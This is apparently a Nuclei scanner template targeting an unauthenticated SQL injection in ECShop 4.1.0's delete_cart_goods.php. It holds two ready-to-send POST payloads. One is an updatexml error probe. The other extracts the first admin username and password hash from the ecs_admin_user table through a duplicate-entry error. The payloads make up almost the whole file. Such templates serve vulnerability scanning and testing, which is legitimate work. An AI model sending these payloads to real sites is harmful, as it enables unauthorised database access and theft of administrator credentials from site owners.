id: ecshop-delete-cart-goods-sqli

info:
  name: ECShop 4.1.0 delete_cart_goods.php SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The front desk is free of login SQL injection vulnerability. This template checks for SQL injection that can retrieve CMS user names and passwords.
  reference:
    - https://www.seebug.org/vuldb/ssvid-99060
  tags:
    - sqli
    - ecshop

http:
  - raw:
      - |
        POST /delete_cart_goods.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Pragma: no-cache
        Cache-Control: no-cache

        id=1||(updatexml(1,concat(0x7e,(select%20md5(1))),1))
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "~c4ca4238a0b923820dcc509a6f75849"
        part: body
  - raw:
      - |
        POST /delete_cart_goods.php HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Content-Type: application/x-www-form-urlencoded
        Connection: keep-alive
        Upgrade-Insecure-Requests: 1
        Pragma: no-cache
        Cache-Control: no-cache

        id=1||(select 1 from (select count(*),concat(0x7e,(select concat(user_name,0x3a,password) from ecs_admin_user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Duplicate entry"
        part: body
